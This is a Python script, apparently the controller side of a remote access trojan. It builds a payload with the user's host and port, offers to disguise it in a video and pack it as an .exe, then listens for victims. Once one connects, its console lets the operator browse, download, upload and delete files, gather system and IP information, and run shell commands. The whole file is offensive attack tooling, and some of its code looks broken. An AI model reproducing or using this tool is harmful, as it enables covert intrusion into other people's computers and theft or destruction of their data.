#!/usr/bin python3

import os  # import os module
import socket
from App import Banner
from App.Banner import style  # importing the Banner.py
import Help  # importing the Banner.py
import time
import subprocess
import shutil


def main():  # Under development
    print(Banner.banner)
    dir = os.getcwd()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Establishing an IPV4 and a TCP connection

    print("Options: ")
    print("[1]: create payload")
    print('Example: Enter "1"')
    payloader_maker = int(input("Choose option: "))
    payload_name = input("Enter name for payload: ")

    if payload_name == "-h":  # To display the help menu
        print(Help.helper)  # Displays the help menu
        payload_name = input("Enter name for payload: ")

    inject = input(
        "Inject payload with video Y/n: ")  # Turn a video into payload. If target palys video, you will have access to the machine
    if inject == "-h":  # To display the help menu
        print(Help.helper)  # Displays the help menu
        inject = input(
            "Inject payload with video Y/n: ")  # Turn a video into payload. If target palys video, you will have access to the machine

    LPORT = input("Enter lport: ")  # The port to listen on
    if LPORT == "-h":  # To display the help menu
        print(Help.helper)  # Displays the help menu
        LPORT = input("Enter lport: ")  # The port to listen on

    LHOST = input("Enter lhost: ")  # Your computers ip
    if LHOST == "-h":  # To display the help menu
        print(Help.helper)  # Displays the help menu
        LHOST = input("Enter lhost: ")  # Your computers ip

    host = ""  # To allow multiple connection from different machines
    port = int(LPORT)  # so as to share to share the same port with the client
    s.bind((host, port))  # binding the port with host
    s.listen()  # listening for incoming connections

    if payloader_maker == 1:
        CWD = os.getcwd()
        with open("Exploit_client.py", "r") as f:  # reading through the Exploit_client.py file (this is the payload)
            reader = f.read()
        with open(f"{payload_name}.py",
                  "w") as p:  # creating and writing to the new file created using the name of the payload you entered

            if "LHOST" in reader:
                host_replacer = reader.replace("LHOST",
                                               LHOST)  # repacing "LHOST" in the payload with the lhost the user entered
                p.write(host_replacer)  # writing to the file
                p.close()  # close the file
        if "LPORT" in reader:  # overwriting the file
            with open(f"{payload_name}.py", "r") as f:
                f.read()  # reading the file
                f.close()  # closing the file
            with open(f"{payload_name}.py", "w") as p:  # overwriting the file
                port_replacer = host_replacer.replace("LPORT",
                                                      LPORT)  # repacing "LHOST" in the payload with the lhost the user entered
                p.write(port_replacer)  # overwriting the file
                p.close()  # close the file

        if inject == "Y":
            if "VideoFalse" in reader:
                with open(f"{payload_name}.py", "r") as f:
                    f.read()  # reading the file
                    f.close()  # closing the file
                with open(f"{payload_name}.py", "w") as p:  # overwriting the file
                    port_replacer = port_replacer.replace("VideoFalse",
                                                          "VideoTrue")  # repacing "LHOST" in the payload with the lhost the user entered
                    p.write(port_replacer)  # overwriting the file
                    p.close()  # close the file
        else:
            pass

        payload_coverter = payload_name + ".py"  # converting payload name user entered to .py
        spec_file = payload_name + ".spec"  # to help us find out the .spec file as it always have thesame name with the payload
        print(style.GREEN)
        subprocess.run(f"pyinstaller --onefile Help.py")  # convert file to .exe

        os.remove(payload_coverter)  # delete the .py payload created
        os.remove(spec_file)  # delete the .spec file created after converting payload to .exe
        build = "build"
        build_path = os.path.join(CWD, build)
        shutil.rmtree(build_path)  # remove the /build path created after converting payload to .exe
        print(style.MAGENTA + f"Payload created in {os.getcwd()}\dist")

    i = ""

    while True:  # while server is running
        print(f"{style.RED}[+] {style.BLUE}Waiting for target...")  # formatting and changing text color
        clt, adr = s.accept()  # to accept connection from client
        print(style.GREEN + "-" * 48)  # formatting and changing text color
        print(
            f"{style.GREEN}|{style.RED}Successfully connected to {adr}{style.GREEN}|")  # formatting and changing text color
        print(style.GREEN + "-" * 48)  # changing text color

        while i != "quit":  # creating a loop, to keep connection persistent until you type quit
            try:

                pwd = os.getcwd()
                i = input(f"{style.RED}Terminal {style.GREEN}{pwd}{style.BLUE}:> {style.RESET}")

                def select_dir():  # for selecting file
                    if i.startswith("cd "):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                select_dir()

                def working_dir():  # for working dir
                    global msg
                    if i == "pwd":
                        clt.send(bytes(i.encode("ansi")))
                        msg_dir = clt.recv(100000000).decode("ansi")
                        print(msg_dir)

                working_dir()

                def list_dir():  # for listing files
                    if i == "ls":
                        clt.send(bytes(i.encode("UTF-8")))
                        msg = clt.recv(100000000).decode("ansi")
                        splitter = msg.split()
                        for words in splitter:
                            length = len(words)
                            word_length = int(length) - 2
                            print(str(words[1:word_length]))

                list_dir()

                def read_file():  # for listing files
                    if i.startswith("cat"):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                read_file()

                def undo_dir():  # function for undoing
                    if i == "cd..":
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        os.chdir(msg)
                        print(msg)

                undo_dir()

                def help():  # function for selecting file
                    if i == "-h":
                        print(Help.helper)

                help()

                # EXTERNAL COMMANDS

                def download():  # download file
                    if i.startswith("download"):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        splits = i.split(" ")
                        RFILE = splits[-1]
                        path = os.getcwd() + "\\" + RFILE
                        text = open(path, "wb")
                        text.write(msg.encode("ansi"))
                        text.close()
                        print(f"File will be saved to {path} when complete..")

                download()

                def upload():  # upload file
                    if i.startswith("upload"):
                        clt.send(bytes(i.encode("ansi")))
                        splits = i.split(" ")
                        RFILE = splits[-2]
                        path = os.path.realpath(RFILE)
                        print(path)
                        text = open(path, "rb")
                        byte = text.read().decode("ansi")
                        clt.send(bytes(byte.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(f"{msg}...")

                upload()

                def remove():  # remove/delete file
                    if i.startswith("rm"):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                remove()

                def getSystemInfo():  # Find location
                    if i.startswith("sysinfo"):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                getSystemInfo()

                def ip_finder():  # find public ip
                    if i == "get_ip":
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                ip_finder()

                def copy():  # copy file
                    if i.startswith("copy"):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                copy()

                def move():  # copy file
                    if i.startswith("move"):
                        clt.send(bytes(i.encode("ansi")))
                        msg = clt.recv(100000000).decode("ansi")
                        print(msg)

                move()

                def cmd():  # establishing command prompt
                    if i.startswith("cmd"):
                        if "-f" in i:
                            clt.send(bytes(i.encode("ansi")))
                            msg = clt.recv(100000000).decode("ansi")
                            current_dir = os.getcwd()
                            with open(str(current_dir) + "\ipconfig.txt", 'a') as f:  # write output to file
                                f.write(f"<----------------{time.ctime()}----------------->\n{msg}\n\n\n")
                                print(msg)
                                f.close()
                                print(f"Files saved in {current_dir}")
                                os.chdir(current_dir)


                        else:
                            clt.send(bytes(i.encode("ansi")))
                            msg = clt.recv(100000000).decode("ansi")
                            print(msg)

                cmd()

            except FileNotFoundError:
                print("File not found...")
            except NameError:
                print("Name Error...")
            except NotADirectoryError:
                print("Bad directory...")
            except UnicodeDecodeError:
                print("'utf-8' codec can't decode byte")
            except TypeError:
                print("a bytes-like object is required, not 'str'")
            except ConnectionAbortedError:
                print("Connection abort")


main()

